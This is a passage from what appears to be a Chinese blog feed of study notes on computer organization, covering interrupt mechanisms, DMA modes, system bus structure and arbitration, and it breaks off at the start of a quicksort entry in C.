中断请求触发器(INTR)和中断屏蔽触发器(MASK)</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE3YjUwNGY0YmNiMDQ1YjE3ZTAucG5n?x-oss-process=image/format,png"></p><ul><li>INTR=1：有请求</li><li>MASK=1：被屏蔽</li><li>在IO设备准备工作已完成（D=1）且没有被屏蔽（MASK=0）的情况下，INTR的D端被置1，在下一个CPU查询信号到来时，INTR输出1；否则输出0</li></ul><h4 id="2-2-2-排队器"><a href="#2-2-2-排队器" class="headerlink" title="2.2.2 排队器"></a>2.2.2 排队器</h4><p>排队器分为硬件和软件两部分，硬件在CPU内或在接口电路中（链式排队器），软件之后会学。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE4MjUwNGY0YmNiMDQ1YjFlN2IucG5n?x-oss-process=image/format,png"></p><p>被选中的输出INTP<del>i</del>为1，没有被选中的都为0.</p><h4 id="2-2-3-中断向量地址形成部件"><a href="#2-2-3-中断向量地址形成部件" class="headerlink" title="2.2.3 中断向量地址形成部件"></a>2.2.3 中断向量地址形成部件</h4><p>CPU响应了IO中断后，要转去执行该设备的中断服务程序，而每个中断服务程序都有不同的入口地址，CPU必须要找到这个入口地址。方法有两种：由软件产生（后面会讲）和由硬件产生（由硬件产生==向量地址==，再由向量地址找到入口地址）。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE4NTUwNGY0YmNiMDQ1YjIzNDAucG5n?x-oss-process=image/format,png"></p><ul><li>排队器输出的数据（INTP<del>1</del>到INTP<del>n</del>组成）经过中断向量地址形成部件（其实就是设备编码器），生成一个向量地址，向量地址中存储的是一个跳转指令，会跳转到中断服务程序的入口地址。</li><li><strong>向量地址实际上就是中断服务程序入口地址的地址</strong>。</li></ul><blockquote><p><strong>中断向量地址和入口地址的区别与联系：</strong></p><p>区别：向量地址是硬件电路（向量编码器）产生的中断源的内存中断向量表表项地址编号；中断入口地址是中断服务程序首址。</p><p>联系：中断向量地址可以理解为中断服务程序入口地址的地址，通过它访存可获得中断服务程序入口地址。</p></blockquote><h4 id="2-2-4-程序中断方式接口电路的组成"><a href="#2-2-4-程序中断方式接口电路的组成" class="headerlink" title="2.2.4 程序中断方式接口电路的组成"></a>2.2.4 程序中断方式接口电路的组成</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE4ODUwNGY0YmNiMDQ1YjI2NzYucG5n?x-oss-process=image/format,png"></p><h3 id="2-3-I-O中断处理过程"><a href="#2-3-I-O中断处理过程" class="headerlink" title="2.3. I/O中断处理过程"></a>2.3. I/O中断处理过程</h3><h4 id="2-3-1CPU响应中断请求的条件和时间"><a href="#2-3-1CPU响应中断请求的条件和时间" class="headerlink" title="2.3.1CPU响应中断请求的条件和时间"></a>2.3.1CPU响应中断请求的条件和时间</h4><ul><li>条件<ul><li>CPU中的<strong>允许中断触发器</strong>EINT=1</li><li>用<strong>开中断</strong>指令将EINT置1</li><li>用<strong>关中断</strong>指令将EINT置0</li></ul></li><li>时间<ul><li>当D=1（随机）且MASK=0时</li><li>在每条指令执行阶段结束前</li><li>CPU发<strong>中断查询信号</strong>（将EINT置1）</li></ul></li></ul><blockquote><p>CPU相应IO中断请求的条件和时间是：当中断允许状态为1(EINT=1)，且至少有一个中断请求被查到，则在一条指令执行完时，响应中断。</p></blockquote><h4 id="2-3-2-I-O中断处理简单过程"><a href="#2-3-2-I-O中断处理简单过程" class="headerlink" title="2.3.2 I/O中断处理简单过程"></a>2.3.2 I/O中断处理简单过程</h4><ol><li>中断请求</li><li>中断判优：排队器</li><li>中断响应</li><li>中断服务</li><li>中断返回</li></ol><h3 id="2-4-中断服务程序的流程"><a href="#2-4-中断服务程序的流程" class="headerlink" title="2.4 中断服务程序的流程"></a>2.4 中断服务程序的流程</h3><h4 id="2-4-1-中断服务程序流程"><a href="#2-4-1-中断服务程序流程" class="headerlink" title="2.4.1 中断服务程序流程"></a>2.4.1 中断服务程序流程</h4><ol><li>保护现场：<ul><li>程序断点的保护：中断隐指令</li><li>寄存器内容的保护：进栈指令</li></ul></li><li>中断服务</li><li>恢复现场：出栈指令，将保存在存储器（或堆栈）中的信息送回到原来的寄存器中</li><li>中断返回</li></ol><h4 id="2-4-2-单重中断"><a href="#2-4-2-单重中断" class="headerlink" title="2.4.2 单重中断"></a>2.4.2 单重中断</h4><ul><li>不允许中断现行的中断服务程序</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE5MzUwNGY0YmNiMDQ1YjMwZWYucG5n?x-oss-process=image/format,png"></p><h4 id="2-4-3-多重中断"><a href="#2-4-3-多重中断" class="headerlink" title="2.4.3 多重中断"></a>2.4.3 多重中断</h4><ul><li>允许级别更高的中断源中断现行的中断服务程序</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE5NzUwNGY0YmNiMDQ1YjM1ZjUucG5n?x-oss-process=image/format,png"></p><ul><li>PC的保护和更新是由<strong>硬件自动完成的</strong></li><li>CPU响应中断最先完成的步骤为<strong>关中断</strong></li></ul><blockquote><p>宏观上，CPU和IO并行工作</p><p>微观上，CPU中断现行程序为IO服务（串行）</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE5ZDUwNGY0YmNiMDQ1YjNiZGMucG5n?x-oss-process=image/format,png"></p></blockquote><h2 id="3-DMA方式"><a href="#3-DMA方式" class="headerlink" title="3. DMA方式"></a>3. DMA方式</h2><h3 id="3-1-DMA与主存交换数据的三种方法"><a href="#3-1-DMA与主存交换数据的三种方法" class="headerlink" title="3.1 DMA与主存交换数据的三种方法"></a>3.1 DMA与主存交换数据的三种方法</h3><p>DMA接口和CPU共享主存，这就有可能会出现两者争用主存的冲突，为了有效地分时使用主存，DMA与主存交换数据时通常可采用如下三种方法：</p><h4 id="3-1-1-停止CPU访问主存"><a href="#3-1-1-停止CPU访问主存" class="headerlink" title="3.1.1 停止CPU访问主存"></a>3.1.1 停止CPU访问主存</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFhMDUwNGY0YmNiMDQ1YjNmYzMucG5n?x-oss-process=image/format,png"></p><ul><li>DMA接口向CPU发送停止信号，要求CPU放弃地址线、数据线和有关控制线的使用权，CPU处于不工作或保持状态</li><li>优点：控制简单</li><li>缺点：未充分发挥CPU对主存的利用率</li></ul><h4 id="3-1-2-周期挪用（周期窃取）"><a href="#3-1-2-周期挪用（周期窃取）" class="headerlink" title="3.1.2 周期挪用（周期窃取）"></a>3.1.2 周期挪用（周期窃取）</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFhNDUwNGY0YmNiMDQ1YjQzZWYucG5n?x-oss-process=image/format,png"></p><ul><li>每次IO设备发出DMA请求时，IO设备便挪用或窃取总线占用权一个或几个<strong>访存周期</strong>，而DMA不请求时，CPU仍继续访问主存</li><li>DMA优先权高于CPU，同时访存时DMA优先</li><li>既实现了IO传送，又发挥了主存与CPU的效率</li></ul><h4 id="3-1-3-DMA与CPU交替访问"><a href="#3-1-3-DMA与CPU交替访问" class="headerlink" title="3.1.3 DMA与CPU交替访问"></a>3.1.3 DMA与CPU交替访问</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFhNzUwNGY0YmNiMDQ1YjQ3MTkucG5n?x-oss-process=image/format,png"></p><ul><li>适用于CPU的工作周期比主存存取周期长的情况，不需要申请建立和归还总线的使用权</li><li>优点：CPU既不停止主程序的运行也不进入等待状态，“透明的DMA”</li><li>缺点：硬件逻辑复杂，实用性不强</li></ul><h3 id="3-2-DMA接口的功能和组成"><a href="#3-2-DMA接口的功能和组成" class="headerlink" title="3.2 DMA接口的功能和组成"></a>3.2 DMA接口的功能和组成</h3><h4 id="3-2-1-DMA接口功能"><a href="#3-2-1-DMA接口功能" class="headerlink" title="3.2.1 DMA接口功能"></a>3.2.1 DMA接口功能</h4><ol><li>向CPU申请DMA传送</li><li>处理总线控制权的转交</li><li>管理系统总线、控制数据传送</li><li>确定数据传送的首地址和长度，修正传送过程中的数据地址和长度</li><li>DMA传送结束时，给出操作完成信号</li></ol><h4 id="3-2-2-DMA接口基本组成"><a href="#3-2-2-DMA接口基本组成" class="headerlink" title="3.2.2 DMA接口基本组成"></a>3.2.2 DMA接口基本组成</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFhYjUwNGY0YmNiMDQ1YjRjMzgucG5n?x-oss-process=image/format,png"></p><ul><li>AR：存放主存地址</li><li>DAR：存放设备地址，或磁盘相关</li><li>WC：字计数器，记录传送了多少个字</li><li>BR：数据缓冲寄存器</li><li>DMA控制逻辑：控制接口内部协调工作，发出各种信号</li><li>中断机构：用于DMA传送完以后，对后续工作的处理</li></ul><h4 id="3-2-3-DMA的工作过程"><a href="#3-2-3-DMA的工作过程" class="headerlink" title="3.2.3 DMA的工作过程"></a>3.2.3 DMA的工作过程</h4><h5 id="DMA的传送过程："><a href="#DMA的传送过程：" class="headerlink" title="DMA的传送过程："></a>DMA的传送过程：</h5><ul><li>==预处理==：通过几条输入输出指令预置如下信息<ul><li>通知DMA控制逻辑传送方向（输入/输出）</li><li>设备地址：DMA的DAR</li><li>主存地址：DMA的AR</li><li>传送字数：DMA的WC</li></ul></li><li>==数据传送==：继续执行主程序，同时完成一批数据传送</li><li>==后处理==：由<strong>中断服务程序</strong>完成，做DMA结束处理<ul><li>检验送入主存的数据是否正确</li><li>决定是否继续用DMA传送其他数据块。若传送，对DMA接口初始化；否则停止外设</li><li>测试在传送过程中是否出现错误，若出错，则转错误诊断及处理错误程序</li></ul></li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFhZjUwNGY0YmNiMDQ1YjUzOGMucG5n?x-oss-process=image/format,png"></p><p>数据传送过程（输入）：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFiMjUwNGY0YmNiMDQ1YjU4OWEucG5n?x-oss-process=image/format,png"></p><p>数据传送过程（输出）：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFiNTUwNGY0YmNiMDQ1YjVlNzUucG5n?x-oss-process=image/format,png"></p><h5 id="DMA接口与系统的连接方式"><a href="#DMA接口与系统的连接方式" class="headerlink" title="DMA接口与系统的连接方式"></a>DMA接口与系统的连接方式</h5><ol><li>具有公共请求线的DMA请求<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFiOTUwNGY0YmNiMDQ1YjYxZmIucG5n?x-oss-process=image/format,png"></li><li>独立的DMA请求<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFiZDUwNGY0YmNiMDQ1YjY1NWYucG5n?x-oss-process=image/format,png"><h5 id="DMA方式与程序中断方式的比较"><a href="#DMA方式与程序中断方式的比较" class="headerlink" title="DMA方式与程序中断方式的比较"></a>DMA方式与程序中断方式的比较</h5></li></ol><table><thead><tr><th></th><th>中断方式</th><th>DMA方式</th></tr></thead><tbody><tr><td>数据传送</td><td>程序（中断服务程序）</td><td>硬件</td></tr><tr><td>响应时间</td><td>指令执行结束</td><td>存取周期结束</td></tr><tr><td>处理异常情况</td><td>能</td><td>不能</td></tr><tr><td>中断请求</td><td>传送数据</td><td>后处理</td></tr><tr><td>优先级</td><td>低</td><td>高</td></tr></tbody></table><h3 id="3-3-DMA接口的类型"><a href="#3-3-DMA接口的类型" class="headerlink" title="3.3 DMA接口的类型"></a>3.3 DMA接口的类型</h3><h4 id="3-3-1-选择型"><a href="#3-3-1-选择型" class="headerlink" title="3.3.1 选择型"></a>3.3.1 选择型</h4><p>在物理上连接多个设备，在逻辑上只允许连接一个设备。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFjMDUwNGY0YmNiMDQ1YjY4ZDcucG5n?x-oss-process=image/format,png"></p><h4 id="3-3-2-多路型"><a href="#3-3-2-多路型" class="headerlink" title="3.3.2 多路型"></a>3.3.2 多路型</h4><p>在物理上连接多个设备，在逻辑上允许连接多个设备同时工作</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFjNDUwNGY0YmNiMDQ1YjZkMWYucG5n?x-oss-process=image/format,png"></p><h4 id="3-3-3-多路型DMA接口的工作原理"><a href="#3-3-3-多路型DMA接口的工作原理" class="headerlink" title="3.3.3 多路型DMA接口的工作原理"></a>3.3.3 多路型DMA接口的工作原理</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTFjNzUwNGY0YmNiMDQ1YjcxNzIucG5n?x-oss-process=image/format,png"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理之系统总线</title>
      <link href="2020/03/10/ji-suan-ji-zu-cheng-yuan-li-zhi-xi-tong-zong-xian/"/>
      <url>2020/03/10/ji-suan-ji-zu-cheng-yuan-li-zhi-xi-tong-zong-xian/</url>
      
        <content type="html"><![CDATA[<blockquote><p>所有含有<strong>学习笔记</strong>字样的博客均为博主个人笔记，不保证全面，不保证没有错误，仅用于个人整理复习使用。</p></blockquote><p>这次的质量不高，最近忙着王者上钻石（大佬别嘲讽我段位低，总共才打了三百多把）（手动狗头）。游戏误事啊！！！！！！！</p><h1 id="系统总线"><a href="#系统总线" class="headerlink" title="系统总线"></a>系统总线</h1><h2 id="1-总线的基本概念"><a href="#1-总线的基本概念" class="headerlink" title="1. 总线的基本概念"></a>1. 总线的基本概念</h2><h3 id="1-1-总线概述"><a href="#1-1-总线概述" class="headerlink" title="1.1 总线概述"></a>1.1 总线概述</h3><p>计算机各部件有两种连接方式：分散连接（各部件单独连线）和<strong>总线连接</strong>。</p><p>现在的计算机主要采用总线连接方式。</p><blockquote><p>总线连接的优点：</p></blockquote><ul><li>便于增减外设</li><li>减少了信息传输线的条数</li></ul><blockquote><p>什么是总线？</p></blockquote><ul><li>是连接各个部件的信息传输线，是各个部件共享的传输设备。</li></ul><blockquote><p>总线上部件特点？</p></blockquote><ul><li>当多个部件与总线连接时，同一时刻只允许有一个部件向总线发送信息，而多个部件可以同时从总线上接收信息。</li></ul><p>为了减轻总线负载，总线上的部件应通过三态驱动缓冲电路与总线连通。</p><h3 id="1-2-单总线结构"><a href="#1-2-单总线结构" class="headerlink" title="1.2 单总线结构"></a>1.2 单总线结构</h3><p>单总线结构将CPU、主存和I/O设备都挂到一组总线上，主存和I/O设备之间的信息交换可以不通过CPU。</p><p>同一时刻，只能有同一对设备使用总线。</p><h3 id="1-3-面向CPU的双总线结构"><a href="#1-3-面向CPU的双总线结构" class="headerlink" title="1.3 面向CPU的双总线结构"></a>1.3 面向CPU的双总线结构</h3><p>CPU和主存之间加了一条专用总线（M总线），主存不直接与I/O设备连接。</p><h3 id="1-4-以存储器为中心的双总线结构"><a href="#1-4-以存储器为中心的双总线结构" class="headerlink" title="1.4 以存储器为中心的双总线结构"></a>1.4 以存储器为中心的双总线结构</h3><p>在单总线结构基础上，单独在CPU和主存之间建立了一条存储总线。</p><p>因技术限制，系统总线和存储总下通常不能同时工作。</p><p>优点：</p><ul><li>速度高，传输效率高</li><li>减轻了系统总线的负担</li></ul><h2 id="2-总线的分类"><a href="#2-总线的分类" class="headerlink" title="2. 总线的分类"></a>2. 总线的分类</h2><p>总线按数据传送方式可分为并行传输总线和串行传输总线。在</p><p>按照连接部件的不同分类：片内总线、系统总线和通信总线。</p><h3 id="2-1-片内总线"><a href="#2-1-片内总线" class="headerlink" title="2.1 片内总线"></a>2.1 片内总线</h3><p>指<strong>芯片内部的总线</strong>，如CPU芯片内部，寄存器与寄存器之间、寄存器与ALU之间都有总线连接。</p><h3 id="2-2-系统总线"><a href="#2-2-系统总线" class="headerlink" title="2.2 系统总线"></a>2.2 系统总线</h3><p><strong>系统总线指CPU、主存、I/O设备各大部件之间的信息传输线</strong>，通常又叫做板级总线和板间总线。按系统传输信息的不同分为三类：数据总线、地址总线和控制总线。</p><h4 id="2-2-1-数据总线"><a href="#2-2-1-数据总线" class="headerlink" title="2.2.1 数据总线"></a>2.2.1 数据总线</h4><ul><li>传输各功能部件之间的数据信息，是<strong>双向</strong>传输总线。</li><li>数据总线的条数称为数据总线宽度，是衡量系统性能的一个重要参数。总线宽度$\leq$机器字长/存储字长。</li></ul><h4 id="2-2-2-地址总线"><a href="#2-2-2-地址总线" class="headerlink" title="2.2.2 地址总线"></a>2.2.2 地址总线</h4><ul><li>主要用来指出数据总线上的源数据或目的数据在主存单元或I/O端口的地址。</li><li>单向传输。</li><li>地址线的位数与存储单元个数有关。</li></ul><h4 id="2-2-3-控制总线"><a href="#2-2-3-控制总线" class="headerlink" title="2.2.3 控制总线"></a>2.2.3 控制总线</h4><ul><li>分配各部件的总线使用权</li><li>控制总线是用来发出各种控制信号的传输线</li><li>单向</li></ul><h3 id="2-3-通信总线"><a href="#2-3-通信总线" class="headerlink" title="2.3 通信总线"></a>2.3 通信总线</h3><ul><li>用于计算机系统之间或计算机系统与其它系统之间的通信</li><li>传输方式有串行和并行。</li></ul><h2 id="3-总线特性及性能指标"><a href="#3-总线特性及性能指标" class="headerlink" title="3. 总线特性及性能指标"></a>3. 总线特性及性能指标</h2><h3 id="3-1-总线特性"><a href="#3-1-总线特性" class="headerlink" title="3.1 总线特性"></a>3.1 总线特性</h3><h4 id="3-1-1-机械特性"><a href="#3-1-1-机械特性" class="headerlink" title="3.1.1 机械特性"></a>3.1.1 机械特性</h4><ul><li>指总线在机械连接方式上的一些性能</li><li>几何尺寸、形状、管脚数、排列顺序以及接头处的可靠接触等</li></ul><h4 id="3-1-2-电气特性"><a href="#3-1-2-电气特性" class="headerlink" title="3.1.2 电气特性"></a>3.1.2 电气特性</h4><ul><li>总线的每一根传输线上信号的<strong>传递方向</strong>和<strong>有效的电平范围</strong></li></ul><h4 id="3-1-3-功能特性"><a href="#3-1-3-功能特性" class="headerlink" title="3.1.3 功能特性"></a>3.1.3 功能特性</h4><ul><li>指总线中每根传输线的功能<ul><li>地址总线：指出地址号</li><li>数据总线：传递数据</li><li>控制总线：发出控制信号</li></ul></li></ul><h4 id="3-1-4-时间特性"><a href="#3-1-4-时间特性" class="headerlink" title="3.1.4 时间特性"></a>3.1.4 时间特性</h4><ul><li>指总线中信号的时序关系，即任一根线在什么时间内有效</li><li>时间特性一般可以用信号时序图来描述</li></ul><h3 id="3-2-总线性能指标"><a href="#3-2-总线性能指标" class="headerlink" title="3.2 总线性能指标"></a>3.2 总线性能指标</h3><ul><li><strong>总线带宽</strong>：指总线在单位时间内可以传输的数据总量，相当于总线的数据传输速率，等于<strong>总线工作频率与总线宽度（字节数，单位是位）的乘积</strong>。实际上就是在总线上每秒能传输的最大字节量。</li><li><strong>标准传输率</strong>：每秒传输的最大字节数。</li><li><strong>时钟同步/异步</strong>：同步与不同步工作</li><li><strong>总线复用</strong>：指两种不同性质且不同时出现的信号分时使用同一组总线。如地址总线与数据总线共用一组物理线路，可以提高总线的利用率。</li><li><strong>信号线数</strong>：地址总线、数据总线和控制总线三种总线数的总和。</li><li><strong>总线控制方式</strong>：包括突发工作、自动配置、仲裁方式、逻辑方式、计数方式等。</li><li><strong>负载能力</strong></li></ul><h3 id="3-3-总线标准"><a href="#3-3-总线标准" class="headerlink" title="3.3 总线标准"></a>3.3 总线标准</h3><p>总线标准可以理解为系统与模块、模块与模块之间的互连的标准界面，总线标准的设置主要解决不同厂家各类模块化产品的兼容问题。</p><ul><li>VESA：视频电子标准</li><li>PCI：外设部件互联标准</li><li>AGP：显示卡专用的局部总线</li></ul><h2 id="4-总线结构"><a href="#4-总线结构" class="headerlink" title="4. 总线结构"></a>4. 总线结构</h2><h3 id="4-1-单总线结构"><a href="#4-1-单总线结构" class="headerlink" title="4.1 单总线结构"></a>4.1 单总线结构</h3><ul><li>结构简单，便于增减外设</li><li>总线成为了计算机系统的瓶颈</li><li>不允许两个以上的部件在同一时刻向总线传输信息，影响了系统工作效率。这类总线多为小型机或微型机采用。</li></ul><h3 id="4-2-多总线结构"><a href="#4-2-多总线结构" class="headerlink" title="4.2 多总线结构"></a>4.2 多总线结构</h3><p>如果将速率不同的I/O设备进行分类，然后连接在不同的通道上，那么计算机系统的利用率将会更高，因此有了多总线接结构。</p><h4 id="4-2-1-双总线结构"><a href="#4-2-1-双总线结构" class="headerlink" title="4.2.1 双总线结构"></a>4.2.1 双总线结构</h4><ul><li>将速度较低的I/O设备从单总线上分离出来，中间用<strong>通道</strong>连接。</li></ul><h4 id="4-2-2-三总线结构"><a href="#4-2-2-三总线结构" class="headerlink" title="4.2.2 三总线结构"></a>4.2.2 三总线结构</h4><ul><li>在主存和<strong>高速外设</strong>（可有多个）之间连接了一条DMA总线，外部设备可以直接访问内存</li><li>主存总线和DMA总线不能同时对主存进行存取</li><li>I/O总线只有在CPU执行I/O指令时才用到</li></ul><h4 id="4-2-3-三总线结构的又一形式"><a href="#4-2-3-三总线结构的又一形式" class="headerlink" title="4.2.3 三总线结构的又一形式"></a>4.2.3 三总线结构的又一形式</h4><ul><li>CPU与高速缓冲存储器Cache之间有一条局部总线，它将CPU与Cache或更多的局部设备连接</li><li>扩展总线影响外部设备工作速度</li></ul><h4 id="4-2-4-四总线结构"><a href="#4-2-4-四总线结构" class="headerlink" title="4.2.4 四总线结构"></a>4.2.4 四总线结构</h4><ul><li>思想：分类组织</li><li>扩展总线上连接的是低速设备</li></ul><h2 id="5-总线控制"><a href="#5-总线控制" class="headerlink" title="5. 总线控制"></a>5. 总线控制</h2><p>总线上连接着多个部件，由哪个部件发送信息，给信息传送定时，防止信息丢失，避免多个部件同时发送，规定接受信息的部件等问题，由<strong>总线控制器</strong>统一管理。</p><h3 id="5-1-总线判优控制"><a href="#5-1-总线判优控制" class="headerlink" title="5.1 总线判优控制"></a>5.1 总线判优控制</h3><ul><li><strong>主设备（主模块）</strong>：指一次总线传输期间，拥有<strong>总线控制权</strong>的设备（模块）。</li><li><strong>从设备（从模块）</strong>：指一次总线传输期间，配合主设备完成传输的设备（模块），它只能<strong>被动接受主设备发来的命令</strong>。</li><li>主设备对总线有控制权，从设备只能相应从主设备发来的总线命令。</li><li>总线判优控制解决多个部件同时申请总线时的使用权分配问题。</li><li>总线判优控制可以分为<strong>集中式</strong>和<strong>分布式</strong>两种，前者将控制逻辑集中在一处（如CPU），后者将控制逻辑分散在与总线连接的各个部件或设备上。集中式有链式查询、计数器定时查询、独立请求方式等。</li></ul><h4 id="5-1-1-链式查询"><a href="#5-1-1-链式查询" class="headerlink" title="5.1.1 链式查询"></a>5.1.1 链式查询</h4><ul><li>一般用于微型计算机或简单的嵌入式系统中</li><li>优点：结构简单，增删设备容易</li><li>缺点：对电路故障特别敏感，速度慢</li></ul><h4 id="5-1-2-计数器定时查询"><a href="#5-1-2-计数器定时查询" class="headerlink" title="5.1.2 计数器定时查询"></a>5.1.2 计数器定时查询</h4><ul><li>计数器每次从0开始（前面的设备优先级高），或者每次从上一次计数结束的位置开始（优先级一样）。</li><li>设备地址传输的地址由计数器给出</li><li>需要的地址线位数是$\log_{2}{n}$向上取整</li></ul><h4 id="5-1-3-独立请求方式"><a href="#5-1-3-独立请求方式" class="headerlink" title="5.1.3 独立请求方式"></a>5.1.3 独立请求方式</h4><ul><li>控制部件内部的排队器决定了优先级，排队器可以事先设置优先级</li><li>速度快</li></ul><h4 id="5-1-4-三种方式的比较"><a href="#5-1-4-三种方式的比较" class="headerlink" title="5.1.4 三种方式的比较"></a>5.1.4 三种方式的比较</h4><ul><li>链式查询连线简单，易于扩充，对电路故障最敏感</li><li>计数器查询优先级设置较灵活，对故障不敏感，连线及控制过程较复杂</li><li>独立请求方式判优速度最快，但硬件器件用量大，连线多，成本高</li></ul><h3 id="5-2-总线通信控制"><a href="#5-2-总线通信控制" class="headerlink" title="5.2 总线通信控制"></a>5.2 总线通信控制</h3><ul><li>总线完成一次完整而可靠的传输所需时间成为总线的<strong>传输周期</strong>，可分为四个阶段：申请分配阶段，寻址阶段，传数阶段，结束阶段<ul><li>申请分配阶段：主模块申请，总线仲裁决定</li><li>寻址阶段：主模块向从模块给出地址和命令</li><li>传数阶段：主模块和从模块交换数据</li><li>结束阶段：主模块撤销有关信息</li></ul></li><li>总线的通信控制指总线传送过程中双方的时间配合方式，主要解决通信双方如何获知传输开始和传输结束，以及通信双方如何协调配合。</li></ul><h4 id="5-2-1-同步通信"><a href="#5-2-1-同步通信" class="headerlink" title="5.2.1 同步通信"></a>5.2.1 同步通信</h4><ul><li>有统一的时钟控制数据传送</li><li>优点：规定明确、统一，模块间的配合协调一致</li><li>缺点：主从模块必须在限定时间内完成规定要求，不同速度部件必须按速度最慢的部件来设计时钟，效率低，使用受局限，灵活性差</li><li>同步通信一般用于总线长度较短、各部件存取时间比较一致的场合</li></ul><h4 id="5-2-2-异步通信"><a href="#5-2-2-异步通信" class="headerlink" title="5.2.2 异步通信"></a>5.2.2 异步通信</h4><ul><li>没有公共的时钟，只采用握手信号</li><li>异步通信方式为分为不互锁、半互锁和全互锁三种类型</li><li>波特率：单位时间内传送的二进制信号数</li><li>比特率：用单位时间内传输的二进制代码的<strong>有效位</strong>（bit）数来表述</li></ul><p>$$<br>比特率={1 \over 二进制位持续时间}\<br>比特率={波特率\times 单个调制状态对应的二进制位数}<br>$$</p><h4 id="5-2-3-半同步通信"><a href="#5-2-3-半同步通信" class="headerlink" title="5.2.3 半同步通信"></a>5.2.3 半同步通信</h4><ul><li>同步：有统一时钟，信号发出在参照系统时钟前沿开始，而接收方都采用时钟后沿时刻来进行判断、识别</li><li>异步：允许不同速度的模块和谐工作，为此增设了一条“等待”相应信号线</li><li>适用于系统工作速度不高、包含工作速度差异较大的各类设备的简单系统，工作效率介于同步与异步之间</li><li>缺点：系统时钟频率不能太高</li></ul><blockquote><p>上述三种通信的共同点：</p><p>一个总线传输周期内，</p><ul><li>主模块发地址、命令：占用总线</li><li>从模块准备数据：不占用总线，总线空闲</li><li>从模块向主模块发数据：占用总线</li></ul></blockquote><h4 id="5-2-4-分离式通信"><a href="#5-2-4-分离式通信" class="headerlink" title="5.2.4 分离式通信"></a>5.2.4 分离式通信</h4><ul><li>目的：充分挖掘系统总线每个瞬间的潜力，将一个总线传输周期分解为两个子周期。</li><li>子周期一：主模块申请占用总线，使用完后放弃总线使用权</li><li>子周期二：从模块申请占用总线，将各种信息送至总线上（这里的从模块其实变为了主模块）</li></ul><p>分离式通信的特点：</p><ol><li>各模块都有权申请占用总线</li><li>在得到总线使用权后，主模块在限定时间内向对方传送信息，采用同步方式传送，不再等待应答信号</li><li>各模块在准备数据传送的过程中都不占用总线，总线可接受其他模块的请求</li><li>总线被占用时都在作有效工作</li></ol><p>分离式通信充分提高了总线的有效占用，适合大型计算机系统。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速排序算法</title>
      <link href="2020/03/08/kuai-su-pai-xu-suan-fa/"/>
      <url>2020/03/08/kuai-su-pai-xu-suan-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><p>快速排序的原理是在要排序的数列中找到一个基准数k（一般选取第一个），然后将这个待排序的数列中小于k的数字全部移到k的左边，大于k的数字全部移到k的右边。这样我们就得到了两个数列，再对以上两个数列重复上面的操作，直到全部排序完成，再组合成一个数列即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token comment">/*按序输出数组元素*/</span><span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token 